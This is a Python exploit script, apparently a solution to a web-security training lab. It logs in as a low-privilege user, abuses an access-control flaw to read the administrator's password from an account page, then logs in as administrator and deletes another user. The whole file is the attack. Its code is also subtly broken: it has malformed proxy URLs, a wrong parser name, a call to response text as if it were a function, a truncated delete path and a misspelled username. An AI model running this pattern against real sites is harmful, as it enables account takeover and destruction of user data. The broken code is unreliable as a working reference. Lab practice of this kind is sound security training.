import sys
import requests
import urllib3
from bs4 import BeautifulSoup
import re 

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http':'http//127.0.0.1:8080', 'https':'https//127.0.0.1:8080'}

def get_csrf_token(s, url):
    r= s.get(url, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, 'html-parser')
    csrf =soup.find("input",{'name':'csrf'})['value']
    return csrf

def retrieve_admin_password(s, url):
    #get CSRF token from login page 
    login_url = url + '/login'
    csrf_token = get_csrf_token(s, login_url)    
    #Rest of the code here 
    #Logging in as the user weiner 
    print("(+) Logging in as the user weiner...")
    login_data = {'csrf': csrf_token, 'username':'weiner', 'password':'peter'}
    r = s.post(login_url, data=login_data , verify=False, proxies=proxies)
    res= r.text()
    if 'Log out' in res:
        print('(+) Successfully Logged in as user weiner ')        
        #Obtain Carlos's API key       
        #Exploite the access control vulnerability to access the user carlos  
        admin_url = url + '/my-account?id=administrator'
        r = s.get(admin_url, verify=False, proxies=proxies)
        res = r.text()
        if 'administrator' in res: 
            print("(+) Successfully exploited the Access control vulnerability")
            print("(+) Retreiving the password for the user administrator...")
            soup = BeautifulSoup(r.text, 'html-parser')
            password=soup.find("input",{'name':'password'})['value']
            return password
        else:
            print("(+) Failed to get access to the administrator's account")
            sys.exit(-1)
    else:
        print('(+) Failed to log in as user weiner ')
        sys.exit(-1)

def delete_carlos_user(s, url, password):
    #get CSRF token from login page 
    login_url = url + '/login'
    csrf_token = get_csrf_token(s, login_url)
    #Rest of the code here 
    #Logging in as the user administrator 
    print("(+) Logging in as the user administrator...")
    login_data = {'csrf': csrf_token, 'username':'administrator', 'password':password}
    r = s.post(login_url, data=login_data , verify=False, proxies=proxies)
    res= r.text()
    if 'Log out' in res:
        print('(+) Successfully Logged in as user administrator ')
        # Deleting a user is        
        print("(+) Deleting a user carlos...")
        delete_user_url = url + '/admin/delet?username=carlos'
        r =s.get(delete_user_url, verify=False, proxies=proxies)
        if r.status_code == 200:
            print('(+) Successfully deleted the user carlos')
        else:
            print('(+) Failed to delete the user carlos')
            sys.exit(-1)   
    else: 
        print('(+) Failure to log in as user administrator')
        sys.exit(-1)

def main():
    if len(sys.argv) != 2:
        print(" (+) Usage: %s <url>" % sys.argv [0])
        print(" (+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    s = requests.session()
    url = sys.argv[1]
    admin_password = retrieve_admin_password(s, url)

    #Delete the user 'carlos' from the admin-panal
    s = requests.session()
    delete_carlos_user(s, url, admin_password)

if __name__ == '__main__':
    main()